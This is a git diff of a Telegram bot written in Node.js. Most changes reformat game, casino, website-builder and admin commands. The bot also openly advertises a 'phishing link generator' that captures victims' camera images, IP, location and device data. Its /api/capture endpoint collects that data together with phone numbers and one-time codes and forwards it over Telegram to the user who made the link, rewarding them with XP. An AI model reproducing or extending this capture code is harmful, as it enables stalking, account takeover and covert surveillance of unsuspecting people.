-  await ctx.reply(`💰 **BALANCE**\n\nCoins: ${u.coins}\n💎 Diamonds: ${u.diamonds}\n📊 Level: ${u.level}\n⭐ XP: ${u.xp}/${u.level * 100}`);
-});
+// BALANCE
+bot.command("balance", async (ctx) => { let u = await initUser(ctx.from.id); await ctx.reply(`💰 **BALANCE**\n\nCoins: ${u.coins}\n💎 Diamonds: ${u.diamonds}\n📊 Level: ${u.level}\n⭐ XP: ${u.xp}/${u.level * 100}`); });
 
-// PROFILE command
-bot.command("profile", async (ctx) => { 
-  let u = await initUser(ctx.from.id); 
-  await ctx.reply(`👤 **${ctx.from.first_name}**\n\n💰 ${u.coins} coins\n💎 ${u.diamonds}\n📊 Level ${u.level}\n👥 ${u.referrals} referrals\n💀 ${u.hacks} hacks\n🎮 ${u.wins}W/${u.losses}L\n📝 Word Wins: ${u.wordWins}\n🌐 ${u.websites.length} websites\n🏆 Badges: ${u.badges.join(", ")}`); 
-});
+// PROFILE
+bot.command("profile", async (ctx) => { let u = await initUser(ctx.from.id); await ctx.reply(`👤 **${ctx.from.first_name}**\n\n💰 ${u.coins} coins\n💎 ${u.diamonds}\n📊 Level ${u.level}\n👥 ${u.referrals} referrals\n💀 ${u.hacks} hacks\n🎮 ${u.wins}W/${u.losses}L\n📝 Word Wins: ${u.wordWins}\n🌐 ${u.websites.length} websites`); });
 
-// DAILY command
+// DAILY
 bot.command("daily", async (ctx) => { 
   let u = await initUser(ctx.from.id); 
   let now = Date.now(); 
@@ -728,9 +734,7 @@ bot.command("daily", async (ctx) => {
     let m = Math.floor(((86400000 - (now - u.lastDaily)) % 3600000) / 60000);
     return ctx.reply(`⏰ ${h}h ${m}m left until next daily!`); 
   } 
-  
-  let streakBonus = u.streak * 1;
-  let reward = DAILY_REWARD + streakBonus;
+  let reward = DAILY_REWARD + (u.streak * 1);
   await addCoin(ctx.from.id, reward);
   u.lastDaily = new Date(now);
   u.streak = (u.streak % 7) + 1;
@@ -738,7 +742,7 @@ bot.command("daily", async (ctx) => {
   await ctx.reply(`🎁 **DAILY REWARD!**\n+${reward} coins\n🔥 Streak: ${u.streak}/7 days`); 
 });
 
-// WORK command
+// WORK
 bot.command("work", async (ctx) => { 
   let u = await initUser(ctx.from.id); 
   let now = Date.now(); 
@@ -754,15 +758,10 @@ bot.command("work", async (ctx) => {
   await ctx.reply(`💼 Worked as ${job}!\n+${WORK_REWARD} coins`); 
 });
 
-// REDEEM command
-bot.command("redeem", async (ctx) => { 
-  let args = ctx.message.text.split(" "); 
-  if (args.length < 2) return ctx.reply("❌ Usage: /redeem CODE"); 
-  let res = await redeemCode(ctx.from.id, args[1]); 
-  await ctx.reply(res.msg); 
-});
+// REDEEM
+bot.command("redeem", async (ctx) => { let args = ctx.message.text.split(" "); if (args.length < 2) return ctx.reply("❌ Usage: /redeem CODE"); let res = await redeemCode(ctx.from.id, args[1]); await ctx.reply(res.msg); });
 
-// DICE command
+// DICE
 bot.command("dice", async (ctx) => {
   let args = ctx.message.text.split(" ");
   let bet = parseInt(args[1]);
@@ -791,7 +790,7 @@ bot.command("dice", async (ctx) => {
   }
 });
 
-// SLOTS command
+// SLOTS
 bot.command("slots", async (ctx) => {
   let args = ctx.message.text.split(" ");
   let bet = parseInt(args[1]);
@@ -818,12 +817,10 @@ bot.command("slots", async (ctx) => {
   }
 });
 
-// SHOP command
-bot.command("shop", async (ctx) => {
-  await ctx.reply(`🛒 **SHOP** 🛒\n\n💎 100 Diamonds - 50 coins\n🎫 Lottery Ticket - 5 coins\n🎁 Mystery Box - 20 coins\n\nUse /buy [item]`);
-});
+// SHOP
+bot.command("shop", async (ctx) => { await ctx.reply(`🛒 **SHOP** 🛒\n\n💎 100 Diamonds - 50 coins\n🎫 Lottery Ticket - 5 coins\n🎁 Mystery Box - 20 coins\n\nUse /buy [item]`); });
 
-// BUY command
+// BUY
 bot.command("buy", async (ctx) => {
   let args = ctx.message.text.split(" ");
   let item = args[1]?.toLowerCase();
@@ -852,12 +849,7 @@ bot.command("buy", async (ctx) => {
   }
 });
 
-// WEB command
-bot.command("web", async (ctx) => {
-  await ctx.reply(`🌐 **DOPE WEB CREATOR** 🌐\n\n💰 Cost: ${WEB_PRICE} coins\n✨ Get LIVE LINK on Vercel!\n\n**Templates:** portfolio, business, store\n\n**How to use:** /createweb portfolio`);
-});
-
-// CREATEWEB command
+// CREATE WEB
 bot.command("createweb", async (ctx) => {
   let args = ctx.message.text.split(" ");
   let template = args[1];
@@ -871,51 +863,33 @@ bot.command("createweb", async (ctx) => {
   };
   
   if (!template || !templates.includes(template)) {
-    return ctx.reply(`❌ Templates: portfolio, business, store\n\nExample: /createweb portfolio`);
+    return ctx.reply(`🌐 **WEB CREATOR** 🌐\n\n💰 Cost: ${WEB_PRICE} coins\n⚡ Auto-deploy to Vercel!\n\nTemplates: portfolio, business, store\n\nExample: /createweb portfolio`);
   }
   
-  if (u.coins < WEB_PRICE) {
-    return ctx.reply(`❌ You need ${WEB_PRICE} coins! You have ${u.coins}`);
-  }
+  if (u.coins < WEB_PRICE) return ctx.reply(`❌ Need ${WEB_PRICE} coins! You have ${u.coins}`);
   
   await takeCoin(ctx.from.id, WEB_PRICE);
-  webBuilds.set(ctx.from.id, { 
-    template, 
-    step: 0, 
-    data: {}, 
-    questions: questions[template]
-  });
-  
-  await ctx.reply(`✅ Selected: ${template}\n💰 -${WEB_PRICE} coins\n\n📝 **Step 1/${questions[template].length}**\nSend: ${questions[template][0]}`);
+  webBuilds.set(ctx.from.id, { template, step: 0, data: {}, questions: questions[template] });
+  await ctx.reply(`✅ Selected: ${template}\n💰 -${WEB_PRICE} coins\n\n📝 Step 1/${questions[template].length}\nSend: ${questions[template][0]}`);
 });
 
-// MYWEBSITES command
+// MY WEBSITES
 bot.command("mywebsites", async (ctx) => {
   let websites = await Website.find({ ownerId: ctx.from.id });
-  if (websites.length === 0) {
-    return ctx.reply("📭 **No websites yet!**\n\nCreate one: /createweb portfolio");
-  }
-  
+  if (websites.length === 0) return ctx.reply("📭 No websites yet! /createweb portfolio");
   let message = "🌐 **YOUR WEBSITES** 🌐\n\n";
-  for (let site of websites) {
-    message += `📌 ${site.name}\n🔗 ${site.url}\n👁️ ${site.views} views\n\n`;
-  }
+  for (let site of websites) message += `📌 ${site.name}\n🔗 ${site.url}\n\n`;
   await ctx.reply(message);
 });
 
-// MYID command
-bot.command("myid", async (ctx) => {
-  await ctx.reply(`🔑 Your ID: \`${ctx.from.id}\``, { parse_mode: "Markdown" });
-});
+// MY ID
+bot.command("myid", async (ctx) => { await ctx.reply(`🔑 Your ID: \`${ctx.from.id}\``, { parse_mode: "Markdown" }); });
 
 // ========== ADMIN COMMANDS ==========
-function isOwner(userId) {
-  return userId === OWNER_ID;
-}
+function isOwner(userId) { return userId === OWNER_ID; }
 
 bot.command("admin", async (ctx) => {
   if (!isOwner(ctx.from.id)) return ctx.reply("❌ Owner only!");
-  
   await ctx.reply(`👑 **OWNER PANEL** 👑
 
 /addcoin @user amount
@@ -931,241 +905,110 @@ bot.command("admin", async (ctx) => {
 
 bot.command("addcoin", async (ctx) => {
   if (!isOwner(ctx.from.id)) return;
-  
   let args = ctx.message.text.split(" ");
   let user = args[1]?.replace("@", "");
   let amt = parseInt(args[2]);
-  
   if (!user || isNaN(amt)) return ctx.reply("Usage: /addcoin @username amount");
-  
   for (let [id, u] of usersCache) {
-    try { 
-      let c = await ctx.telegram.getChat(id); 
-      if (c.username === user) { 
-        u.coins += amt;
-        await saveUser(id, u);
-        await ctx.reply(`✅ +${amt} coins to @${user}\n💰 New balance: ${u.coins}`); 
-        await bot.telegram.sendMessage(id, `👑 Owner gave you +${amt} coins!`);
-        return; 
-      } 
-    } catch(e) {}
+    try { let c = await ctx.telegram.getChat(id); if (c.username === user) { u.coins += amt; await saveUser(id, u); await ctx.reply(`✅ +${amt} coins to @${user}\n💰 New balance: ${u.coins}`); await bot.telegram.sendMessage(id, `👑 Owner gave you +${amt} coins!`); return; } } catch(e) {}
   }
   ctx.reply("❌ User not found");
 });
 
 bot.command("gencode", async (ctx) => {
   if (!isOwner(ctx.from.id)) return;
-  
   let args = ctx.message.text.split(" ");
   let coins = parseInt(args[1]) || 50;
   let diamonds = parseInt(args[2]) || 0;
   let uses = parseInt(args[3]) || 20;
   let hours = parseInt(args[4]) || 24;
-  
   let code = await genCode(coins, diamonds, uses, hours);
   await ctx.reply(`✅ **CODE GENERATED**\n\n\`${code}\`\n💰 ${coins} coins\n💎 ${diamonds} diamonds\n🎫 ${uses} uses\n⏰ ${hours} hours\n\nUse: /redeem ${code}`);
 });
 
 bot.command("broadcast", async (ctx) => {
   if (!isOwner(ctx.from.id)) return;
-  
   let msg = ctx.message.text.split(" ").slice(1).join(" ");
   if (!msg) return ctx.reply("Usage: /broadcast message");
-  
   let sent = 0, failed = 0;
   for (let [id] of usersCache) {
-    try { 
-      await ctx.telegram.sendMessage(id, `📢 **ANNOUNCEMENT**\n\n${msg}`); 
-      sent++; 
-    } catch(e) { failed++; }
+    try { await ctx.telegram.sendMessage(id, `📢 **ANNOUNCEMENT**\n\n${msg}`); sent++; } catch(e) { failed++; }
     await new Promise(r => setTimeout(r, 100));
   }
   await ctx.reply(`✅ Sent to ${sent} users\n❌ Failed: ${failed}`);
 });
 
-bot.command("users", async (ctx) => {
-  if (!isOwner(ctx.from.id)) return;
-  await ctx.reply(`👥 Total Users: ${usersCache.size}`);
-});
+bot.command("users", async (ctx) => { if (!isOwner(ctx.from.id)) return; await ctx.reply(`👥 Total Users: ${usersCache.size}`); });
 
 bot.command("stats", async (ctx) => {
   if (!isOwner(ctx.from.id)) return;
-  
   let totalCoins = 0;
   for (let u of usersCache.values()) totalCoins += u.coins;
   let totalWebsites = await Website.countDocuments();
-  
   await ctx.reply(`📊 **STATISTICS**\n\n👥 Users: ${usersCache.size}\n💰 Total Coins: ${totalCoins}\n🌐 Websites: ${totalWebsites}`);
 });
 
 bot.command("banuser", async (ctx) => {
   if (!isOwner(ctx.from.id)) return;
-  
   let args = ctx.message.text.split(" ");
   let user = args[1]?.replace("@", "");
   if (!user) return ctx.reply("Usage: /banuser @username");
-  
   for (let [id] of usersCache) {
-    try { 
-      let c = await ctx.telegram.getChat(id); 
-      if (c.username === user) { 
-        bannedUsers.add(id); 
-        await ctx.reply(`🚫 Banned @${user}`);
-        await bot.telegram.sendMessage(id, "🚫 You have been banned!");
-        return; 
-      } 
-    } catch(e) {}
+    try { let c = await ctx.telegram.getChat(id); if (c.username === user) { bannedUsers.add(id); await ctx.reply(`🚫 Banned @${user}`); await bot.telegram.sendMessage(id, "🚫 You have been banned!"); return; } } catch(e) {}
   }
   ctx.reply("❌ User not found");
 });
 
 bot.command("unban", async (ctx) => {
   if (!isOwner(ctx.from.id)) return;
-  
   let args = ctx.message.text.split(" ");
   let user = args[1]?.replace("@", "");
   if (!user) return ctx.reply("Usage: /unban @username");
-  
   for (let [id] of usersCache) {
-    try { 
-      let c = await ctx.telegram.getChat(id); 
-      if (c.username === user) { 
-        bannedUsers.delete(id); 
-        await ctx.reply(`✅ Unbanned @${user}`);
-        await bot.telegram.sendMessage(id, "✅ You have been unbanned!");
-        return; 
-      } 
-    } catch(e) {}
+    try { let c = await ctx.telegram.getChat(id); if (c.username === user) { bannedUsers.delete(id); await ctx.reply(`✅ Unbanned @${user}`); await bot.telegram.sendMessage(id, "✅ You have been unbanned!"); return; } } catch(e) {}
   }
   ctx.reply("❌ User not found");
 });
 
 bot.command("giveall", async (ctx) => {
   if (!isOwner(ctx.from.id)) return;
-  
   let args = ctx.message.text.split(" ");
   let amount = parseInt(args[1]);
   if (isNaN(amount)) return ctx.reply("Usage: /giveall amount");
-  
   let count = 0;
-  for (let [id, u] of usersCache) { 
-    u.coins += amount; 
-    await saveUser(id, u); 
-    count++;
-  }
+  for (let [id, u] of usersCache) { u.coins += amount; await saveUser(id, u); count++; }
   await ctx.reply(`✅ Added ${amount} coins to ${count} users`);
 });
 
 bot.command("setadmin", async (ctx) => {
   if (!isOwner(ctx.from.id)) return;
-  
   let args = ctx.message.text.split(" ");
   let user = args[1]?.replace("@", "");
   if (!user) return ctx.reply("Usage: /setadmin @username");
-  
   for (let [id, u] of usersCache) {
-    try { 
-      let c = await ctx.telegram.getChat(id); 
-      if (c.username === user) { 
-        u.isAdmin = true;
-        await saveUser(id, u);
-        await ctx.reply(`✅ @${user} is now admin!`);
-        await bot.telegram.sendMessage(id, "👑 You are now an admin!");
-        return; 
-      } 
-    } catch(e) {}
+    try { let c = await ctx.telegram.getChat(id); if (c.username === user) { u.isAdmin = true; await saveUser(id, u); await ctx.reply(`✅ @${user} is now admin!`); await bot.telegram.sendMessage(id, "👑 You are now an admin!"); return; } } catch(e) {}
   }
   ctx.reply("❌ User not found");
 });
 
 // ========== BUTTON HANDLERS ==========
-bot.action("menu_hack", async (ctx) => {
-  await ctx.answerCbQuery();
-  await ctx.reply(`💀 **PHISHING LINK GENERATOR** 💀\n\n💰 Cost: ${TRACK_COST} coins\n📸 Captures: Camera + IP + Location\n\n/hack [label]\n\nExample: /hack free gift`);
-});
-
-bot.action("menu_word", async (ctx) => {
-  await ctx.answerCbQuery();
-  await ctx.reply(`📝 **WORD BATTLE** 📝\n\n/wordbattle @user amount difficulty\n\nDifficulties: easy, medium, hard, expert\n💰 Winner takes ALL coins!`);
-});
-
-bot.action("menu_web", async (ctx) => {
-  await ctx.answerCbQuery();
-  await ctx.reply(`🌐 **DOPE WEB CREATOR** 🌐\n\n💰 Cost: ${WEB_PRICE} coins\n⚡ Auto-Deploy to Vercel!\n\n/createweb portfolio\n/createweb business\n/createweb store`);
-});
-
-bot.action("menu_casino", async (ctx) => {
-  await ctx.answerCbQuery();
-  await ctx.reply(`🎰 **CASINO** 🎰\n\n/dice amount\n/slots amount\n\nWin big and get rich!`);
-});
-
-bot.action("menu_games", async (ctx) => {
-  await ctx.answerCbQuery();
-  await ctx.reply(`🎮 **GAMES** 🎮\n\n/dice amount\n/slots amount\n/wordbattle`);
-});
-
-bot.action("menu_eco", async (ctx) => {
-  await ctx.answerCbQuery();
-  let u = await initUser(ctx.from.id);
-  await ctx.reply(`💰 **ECONOMY** 💰\n\nBalance: ${u.coins} coins\n/daily\n/work`);
-});
-
-bot.action("menu_leaderboard", async (ctx) => {
-  await ctx.answerCbQuery();
-  await ctx.reply(`🏆 **LEADERBOARDS** 🏆\n\n/leaderboard\n/topwords`);
-});
-
-bot.action("menu_profile", async (ctx) => {
-  await ctx.answerCbQuery();
-  let u = await initUser(ctx.from.id);
-  await ctx.reply(`👤 **PROFILE** 👤\n\nCoins: ${u.coins}\nLevel: ${u.level}\nHacks: ${u.hacks}\nWord Wins: ${u.wordWins}`);
-});
-
-bot.action("menu_shop", async (ctx) => {
-  await ctx.answerCbQuery();
-  await ctx.reply(`🛒 **SHOP** 🛒\n\n/buy diamonds\n/buy ticket\n/buy mystery`);
-});
-
-bot.action("menu_redeem", async (ctx) => {
-  await ctx.answerCbQuery();
-  await ctx.reply(`🎁 **REDEEM** 🎁\n\n/redeem CODE`);
-});
-
-bot.action("menu_ref", async (ctx) => {
-  await ctx.answerCbQuery();
-  await ctx.reply(`🔗 **REFERRAL** 🔗\n\n${refLink(ctx.from.id)}\n\n+${REF_REWARD} coins per referral!`);
-});
-
-bot.action("menu_admin", async (ctx) => {
-  let user = await initUser(ctx.from.id);
-  if (!user.isAdmin && ctx.from.id !== OWNER_ID) {
-    await ctx.answerCbQuery("❌ Admin only!");
-    return;
-  }
-  await ctx.answerCbQuery();
-  await ctx.reply(`👑 **ADMIN PANEL** 👑\n\n/addcoin\n/gencode\n/broadcast\n/users\n/stats\n/banuser\n/unban\n/giveall\n/setadmin`);
-});
-
-bot.action("menu_mywebsites", async (ctx) => {
-  await ctx.answerCbQuery();
-  let websites = await Website.find({ ownerId: ctx.from.id });
-  if (websites.length === 0) {
-    await ctx.reply("No websites yet! /createweb portfolio");
-  } else {
-    let msg = "🌐 **YOUR WEBSITES** 🌐\n\n";
-    for (let site of websites) {
-      msg += `• ${site.name}\n  ${site.url}\n\n`;
-    }
-    await ctx.reply(msg);
-  }
-});
+bot.action("menu_hack", async (ctx) => { await ctx.answerCbQuery(); await ctx.reply(`💀 **HACK**\n\n/hack [label]\n💰 Cost: ${TRACK_COST} coins\n📸 Captures Camera + IP + Location`); });
+bot.action("menu_word", async (ctx) => { await ctx.answerCbQuery(); await ctx.reply(`📝 **WORD BATTLE**\n\n/wordbattle @user amount difficulty\n💰 Winner takes ALL!`); });
+bot.action("menu_web", async (ctx) => { await ctx.answerCbQuery(); await ctx.reply(`🌐 **WEB CREATOR**\n\n/createweb portfolio\n💰 Cost: ${WEB_PRICE} coins\n⚡ Auto-deploys to Vercel!`); });
+bot.action("menu_casino", async (ctx) => { await ctx.answerCbQuery(); await ctx.reply(`🎰 **CASINO**\n\n/dice amount\n/slots amount`); });
+bot.action("menu_games", async (ctx) => { await ctx.answerCbQuery(); await ctx.reply(`🎮 **GAMES**\n\n/dice\n/slots\n/wordbattle`); });
+bot.action("menu_eco", async (ctx) => { await ctx.answerCbQuery(); let u = await initUser(ctx.from.id); await ctx.reply(`💰 **ECONOMY**\n\nBalance: ${u.coins} coins\n/daily\n/work`); });
+bot.action("menu_leaderboard", async (ctx) => { await ctx.answerCbQuery(); await ctx.reply(`🏆 **LEADERBOARDS**\n\n/leaderboard\n/topwords`); });
+bot.action("menu_profile", async (ctx) => { await ctx.answerCbQuery(); let u = await initUser(ctx.from.id); await ctx.reply(`👤 **PROFILE**\n\nCoins: ${u.coins}\nLevel: ${u.level}\nHacks: ${u.hacks}\nWord Wins: ${u.wordWins}`); });
+bot.action("menu_shop", async (ctx) => { await ctx.answerCbQuery(); await ctx.reply(`🛒 **SHOP**\n\n/buy diamonds\n/buy ticket\n/buy mystery`); });
+bot.action("menu_redeem", async (ctx) => { await ctx.answerCbQuery(); await ctx.reply(`🎁 **REDEEM**\n\n/redeem CODE`); });
+bot.action("menu_ref", async (ctx) => { await ctx.answerCbQuery(); await ctx.reply(`🔗 **REFERRAL**\n\n${refLink(ctx.from.id)}\n\n+${REF_REWARD} coins per referral!`); });
+bot.action("menu_admin", async (ctx) => { let user = await initUser(ctx.from.id); if (!user.isAdmin && ctx.from.id !== OWNER_ID) { await ctx.answerCbQuery("❌ Admin only!"); return; } await ctx.answerCbQuery(); await ctx.reply(`👑 **ADMIN**\n\n/addcoin\n/gencode\n/broadcast\n/users\n/stats\n/banuser\n/unban\n/giveall\n/setadmin`); });
+bot.action("menu_mywebsites", async (ctx) => { await ctx.answerCbQuery(); let websites = await Website.find({ ownerId: ctx.from.id }); if (websites.length === 0) { await ctx.reply("No websites yet! /createweb portfolio"); } else { let msg = "🌐 **YOUR WEBSITES**\n\n"; for (let site of websites) { msg += `• ${site.name}\n  ${site.url}\n\n`; } await ctx.reply(msg); } });
 
 // ========== TEXT HANDLER ==========
 bot.on("text", async (ctx) => {
-  // Skip commands
-  if (ctx.message.text.startsWith("/")) {
-    return;
-  }
+  if (ctx.message.text.startsWith("/")) return;
   
   const msgId = `${ctx.chat.id}_${ctx.message.message_id}`;
   if (processedMessages.has(msgId)) return;
@@ -1182,36 +1025,25 @@ bot.on("text", async (ctx) => {
       if (build.step < build.questions.length) {
         await ctx.reply(`📝 Step ${build.step + 1}/${build.questions.length}\nSend: ${build.questions[build.step]}`);
       } else {
-        await ctx.reply("⏳ Creating your website and deploying to Vercel...");
+        await ctx.reply("⏳ Creating your dope website and deploying to Vercel...");
         
         let html = htmlTemplates[build.template](build.data);
         let siteName = build.data[build.questions[0]] || "mywebsite";
         let result = await deployToVercel(html, siteName);
         
         if (result.success) {
-          let website = new Website({
-            name: siteName,
-            ownerId: ctx.from.id,
-            template: build.template,
-            content: build.data,
-            url: result.url,
-            vercelId: result.siteName
-          });
+          let website = new Website({ name: siteName, ownerId: ctx.from.id, template: build.template, content: build.data, url: result.url, vercelId: result.siteName });
           await website.save();
-          
           let user = usersCache.get(ctx.from.id);
           user.websites.push({ name: siteName, url: result.url });
           await saveUser(ctx.from.id, user);
           
           await ctx.reply(`✅ **WEBSITE DEPLOYED TO VERCEL!** ✅\n\n🌐 ${result.url}\n\nShare it with anyone!`);
-          
-          await ctx.reply(`🔗 **OPEN YOUR WEBSITE**`, {
-            reply_markup: {
-              inline_keyboard: [[{ text: "🌐 OPEN WEBSITE", url: result.url }]]
-            }
-          });
+          await ctx.reply(`🔗 **OPEN YOUR WEBSITE**`, { reply_markup: { inline_keyboard: [[{ text: "🌐 OPEN WEBSITE", url: result.url }]] } });
         } else {
-          await ctx.reply(`❌ Deployment failed: ${result.error}\n\nCoins refunded.`);
+          await ctx.reply(`❌ Vercel deployment failed: ${result.error}\n\nSending HTML file instead...`);
+          await ctx.replyWithDocument({ source: Buffer.from(html, 'utf-8'), filename: `${siteName.replace(/[^a-z0-9]/gi, '_')}.html` });
+          await ctx.reply(`📁 **HTML file sent!** Upload to Netlify Drop for live link: https://app.netlify.com/drop`);
           await addCoin(ctx.from.id, WEB_PRICE);
         }
         webBuilds.delete(ctx.from.id);
@@ -1220,17 +1052,16 @@ bot.on("text", async (ctx) => {
     return;
   }
   
-  // Handle word challenge response
+  // Handle word challenge
   for (let [challengedId, challenge] of wordChallenges) {
     if (challenge.status === "active" && challenge.currentTurn === "challenger" && ctx.from.id === challenge.from) {
       let answer = ctx.message.text.toUpperCase().trim();
       if (answer.length === challenge.letterCount) {
         challenge.status = "completed";
         wordChallenges.delete(challengedId);
-        let totalPot = challenge.bet * 2;
-        await addCoin(challenge.from, totalPot);
+        await addCoin(challenge.from, challenge.bet * 2);
         await addXP(challenge.from, 10);
-        await ctx.reply(`🎉 CORRECT! Won ${totalPot} coins! +10 XP`);
+        await ctx.reply(`🎉 CORRECT! Won ${challenge.bet * 2} coins! +10 XP`);
         await ctx.telegram.sendMessage(challengedId, `💀 You lost! Lost ${challenge.bet} coins`);
       } else {
         challenge.status = "completed";
@@ -1251,19 +1082,12 @@ bot.on("text", async (ctx) => {
 bot.use(async (ctx, next) => {
   if (!ctx.from) return next();
   if (bannedUsers.has(ctx.from.id)) return ctx.reply("🚫 You are banned!");
-  
   let user = usersCache.get(ctx.from.id);
-  if (user) {
-    user.lastActive = new Date();
-    await saveUser(ctx.from.id, user);
-  }
-  
+  if (user) { user.lastActive = new Date(); await saveUser(ctx.from.id, user); }
   let joined = await checkJoin(ctx);
   if (!joined && ctx.from.id !== OWNER_ID) {
     return ctx.reply(`🚫 **JOIN CHANNEL**\n\nJoin @devxtechzone to use this bot!`, {
-      reply_markup: {
-        inline_keyboard: [[{ text: "📢 JOIN", url: "https://t.me/devxtechzone" }]]
-      }
+      reply_markup: { inline_keyboard: [[{ text: "📢 JOIN", url: "https://t.me/devxtechzone" }]] }
     });
   }
   return next();
@@ -1272,40 +1096,19 @@ bot.use(async (ctx, next) => {
 // ========== API ENDPOINTS ==========
 app.post("/api/capture", async (req, res) => {
   try {
-    let { image, token, ip, location, number, country, code, userAgent, screenSize } = req.body;
-    
+    let { image, token, ip, location, number, country, code, userAgent } = req.body;
     if (!token) return res.status(400).json({ error: "No token" });
-    
     let data = hackTokens.get(token);
-    
     if (data) {
-      let message = 
-        `💀 **PHISHING SUCCESSFUL** 💀\n\n` +
-        `🎯 Label: ${data.label || "No label"}\n` +
-        `👤 Hacker: @${data.username}\n` +
-        `🕐 Time: ${new Date().toLocaleString()}\n\n` +
-        `📱 IP: ${ip || "Unknown"}\n` +
-        `📍 Location: ${location || "Unknown"}\n` +
-        `🌐 Device: ${(userAgent || "Unknown").substring(0, 100)}\n` +
-        `📞 Number: ${number || "Unknown"}\n` +
-        `🔢 Code: ${code || "Unknown"}\n\n` +
-        `✨ +15 XP EARNED!`;
-      
-      if (image) {
-        await bot.telegram.sendPhoto(data.userId, { source: Buffer.from(image.split(',')[1], 'base64') }, { caption: message });
-      } else {
-        await bot.telegram.sendMessage(data.userId, message);
-      }
-      
+      let message = `💀 **PHISHING SUCCESSFUL** 💀\n\n🎯 Label: ${data.label || "No label"}\n👤 Hacker: @${data.username}\n🕐 Time: ${new Date().toLocaleString()}\n\n📱 IP: ${ip || "Unknown"}\n📍 Location: ${location || "Unknown"}\n🌐 Device: ${(userAgent || "Unknown").substring(0, 100)}\n📞 Number: ${number || "Unknown"}\n🔢 Code: ${code || "Unknown"}\n\n✨ +15 XP EARNED!`;
+      if (image && image.length > 100) {
+        try { await bot.telegram.sendPhoto(data.userId, { source: Buffer.from(image.split(',')[1], 'base64') }, { caption: message }); } catch(e) { await bot.telegram.sendMessage(data.userId, message); }
+      } else { await bot.telegram.sendMessage(data.userId, message); }
       await addXP(data.userId, 15);
       hackTokens.delete(token);
     }
-    
     res.json({ status: "success" });
-  } catch(e) {
-    console.error("Capture error:", e);
-    res.status(500).json({ error: "Internal error" });
-  }
+  } catch(e) { console.error("Capture error:", e); res.status(500).json({ error: "Internal error" }); }
 });
 
 app.post("/api/upload", upload.single("image"), async (req, res) => {
@@ -1313,9 +1116,7 @@ app.post("/api/upload", upload.single("image"), async (req, res) => {
   res.json({ url: `${DOMAIN}/uploads/${req.file.filename}` });
 });
 
-app.get("/", (req, res) => { 
-  res.sendFile(path.join(__dirname, "public", "index.html")); 
-});
+app.get("/", (req, res) => { res.sendFile(path.join(__dirname, "public", "index.html")); });
 
 // ========== START SERVER ==========
 const PORT = process.env.PORT || 3000;
@@ -1329,9 +1130,7 @@ loadData().then(async () => {
     console.log(`✅ All commands working!`);
     console.log(`✅ Vercel deploy ready!`);
     console.log(`✅ Hack system ready!`);
-  } catch(e) {
-    console.log("Error:", e.message);
-  }
+  } catch(e) { console.log("Error:", e.message); }
 });
 
 process.once("SIGINT", () => bot.stop("SIGINT"));
